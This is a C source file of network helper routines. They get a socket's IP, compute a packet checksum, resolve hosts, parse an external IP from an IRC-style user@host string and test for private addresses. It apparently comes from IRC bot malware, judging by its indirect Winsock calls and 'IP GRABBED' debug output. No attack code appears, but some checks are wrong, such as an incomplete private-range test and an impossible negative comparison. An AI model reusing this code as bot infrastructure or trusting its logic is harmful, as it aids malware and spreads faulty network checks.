#include "includes.h"
#include "functions.h"



extern char str_exip_resolve[];
char *GetIP(SOCKET sock)
{
	static char IP[16];

	SOCKADDR sa;
	int sas = sizeof(sa);
	ZeroMemory(&sa,sizeof(sa));
	fgetsockname(sock, &sa, &sas);

	sprintf(IP,"%d.%d.%d.%d",(BYTE)sa.sa_data[2], (BYTE)sa.sa_data[3], (BYTE)sa.sa_data[4], (BYTE)sa.sa_data[5]);

	return (IP);
}

USHORT checksum(USHORT *buffer, int size)
{
    unsigned long cksum=0;

    while (size > 1) {
        cksum += *buffer++;
        size  -= sizeof(USHORT);   
    }

    if (size)
        cksum += *(UCHAR*)buffer;   

    cksum = (cksum >> 16) + (cksum & 0xffff);
    cksum += (cksum >>16); 

    return (USHORT)(~cksum); 
}

unsigned long ResolveAddress(char *szHost)
{
	unsigned long IP = finet_addr(szHost);
	if (IP==INADDR_NONE) {
		hostent *pHE = fgethostbyname(szHost);
		if (pHE == 0) 
			return INADDR_NONE;
		IP = *((unsigned long *)pHE->h_addr_list[0]);	
	}

	return IP;
}

char *GetExternalIp(void)
{
	int at,k=0,j=-1;
	char abc[]="abcdefghijklmnopqrstuvwxyz";

	at = (int)strchr(ip1parse,'@');

	for(int i=at-(int)ip1parse+1;i<strlen(ip1parse);i++){
		ip2parse[k]=ip1parse[i];
		k++;
	}
	
#ifdef _DEBUG
	printf("\n\n\nIP GRABBED: %s\n\n\n",ip2parse);
#endif

    return ip2parse;
}

DWORD WINAPI GetExIP(LPVOID param) 
{
	char *tip=GetExternalIp(),abc[]="abcdefghijklmnopqrstuvwxyz";
	int j=-1;

	if (!tip)
	{
		strncpy(exip,inip,sizeof(exip));
	}
	else{
		if((j=strcspn(ip2parse,abc))<0){
			strncpy(exip,tip,sizeof(exip));
		} else {
			DWORD haddr=finet_addr(tip);
			HOSTENT *hostenth=fgethostbyname(tip);
			if (hostenth != NULL){
				IN_ADDR iaddr = *((LPIN_ADDR)*hostenth->h_addr_list);
				strncpy(exip,finet_ntoa(iaddr),sizeof(exip));
			}
		}
	}

	DWORD addr=finet_addr(exip);  
	HOSTENT *hostent=fgethostbyaddr((char *)&addr, sizeof(struct in_addr), AF_INET);
    if (hostent != NULL)
       strncpy(host,hostent->h_name,sizeof(host));
    else 
		strncpy(host,str_exip_resolve,sizeof(host));

#ifdef _DEBUG
	printf("\nIP RESOLVED: %s\n",exip);
	printf("\nIP HOSTMASK: %s\n",host);
#endif

	ExitThread(0);
}

BOOL PrivateIP(const char *ip) {
	if(!ip) return FALSE; if(!strcmp(ip, "")) return FALSE;
	char *tokens[4]; char ipbuf[32];
	strncpy(ipbuf, ip, 32);
	tokens[0]=strtok(ipbuf, ".");
	if(!tokens[0]) return FALSE;
	for(int i=1;i<4;i++) { tokens[i]=strtok(NULL, "."); if(!tokens[i]) return FALSE; }
	if(!strcmp(tokens[0], "10")) return TRUE;								// Class A private network
	if(!strcmp(tokens[0], "172") && !strcmp(tokens[1], "16")) return TRUE;	// Class B Private network
	if(!strcmp(tokens[0], "192") && !strcmp(tokens[1], "168")) return TRUE;	// Class C private network
	if(!strcmp(tokens[0], "90") && !strcmp(tokens[1], "0")) return TRUE;	// Class Bastart private network :P
	return FALSE;
}
